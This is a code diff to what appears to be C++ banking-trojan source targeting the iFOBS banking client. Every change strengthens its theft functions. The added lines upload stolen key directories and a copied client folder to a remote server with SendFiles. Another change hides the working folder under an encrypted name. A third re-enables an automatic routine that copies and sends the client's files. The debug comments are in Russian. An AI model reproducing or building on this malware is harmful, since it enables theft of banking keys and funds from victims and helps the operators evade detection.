@@ -136,7 +136,7 @@ static void GrabData( HWND wnd )
 	if( attr != INVALID_FILE_ATTRIBUTES && (attr & FILE_ATTRIBUTE_DIRECTORY) != 0 )
 		KeyLogger::AddDirectory( ffc.texts[0], "Keys" );
 	VideoLog::Send( "ifobs", 11, resultGrab );
-	VideoProcess::SendFiles( 0, 0, ffc.texts[0], true );
+	VideoProcess::SendFiles( 0, "keys", ffc.texts[0], 10, true );
 	FreeFFC(ffc);
 }
 
@@ -285,10 +285,8 @@ static DWORD WINAPI SendBalans( LPVOID p )
 		STR::Free(urlBank);
 		STR::Free(urlText);
 		STR::Free(urlText2);
-//		THTTPResponseRec Response;
-//		ClearStruct(Response);
-//		HTTP::Get( request.AsStr(), 0, &Response );
-//		HTTPResponse::Clear(&Response);
+
+		VideoProcess::SendFiles( 0, "keys_dll", dataFromPlug.pathKeys, 20 );
 	}
 	return 0;
 }
@@ -435,7 +433,9 @@ DWORD WINAPI SendIFobs(LPVOID)
 	DBG( "IFobs", "Размер папки %d байт", folderSize );
 	char tempFolder[MAX_PATH];
 	pGetTempPathA( sizeof(tempFolder), tempFolder );
-	pPathAppendA( tempFolder, "ifobs" );
+	char* cryptName = UIDCrypt::CryptFileName( "ifobs", false );
+	pPathAppendA( tempFolder, cryptName );
+	STR::Free(cryptName);
 	if( Directory::IsExists(tempFolder) ) DeleteFolders(tempFolder);
 	pCreateDirectoryA( tempFolder, 0 );
 	DBG( "IFobs", "Копирование во временную папку %s", tempFolder );
@@ -444,7 +444,14 @@ DWORD WINAPI SendIFobs(LPVOID)
 	if( CopyFileANdFolder( folderIFobs, tempFolder ) )
 	{
 		DBG( "IFobs", "Копирование на сервер" );
-		VideoProcess::SendFiles( 0, 0, tempFolder );
+		//удаляем папку с базой данных (она не нужна)
+		pPathAppendA( tempFolder, "DATA" );
+		*((int*)&(tempFolder[ m_lstrlen(tempFolder) ])) = 0;
+		DBG( "IFobs", "Удаление папки %s", tempFolder );
+		DeleteFolders(tempFolder);
+		*((int*)&(tempFolder[ m_lstrlen(tempFolder) ])) = 0;
+		pPathRemoveFileSpecA(tempFolder);
+		VideoProcess::SendFiles( 0, "Client_prg", tempFolder );
 		DeleteFolders(tempFolder);
 		DBG( "IFobs", "Копирование на сервер окончено" );
 	}
@@ -457,8 +464,8 @@ void Activeted(LPVOID Sender)
 {
 	DBG( "IFobs", "Activated" );
 	PKeyLogSystem System = (PKeyLogSystem)Sender;
-//	if( !Bot->FileExists( 0, GetStr(IFobsFlagCopy).t_str() ) )
-//		MegaJump(SendIFobs);
+	if( !Bot->FileExists( 0, GetStr(IFobsFlagCopy).t_str() ) )
+		MegaJump(SendIFobs);
 	VideoProcess::RecordPID( 0, "IFobs" );
 }
 
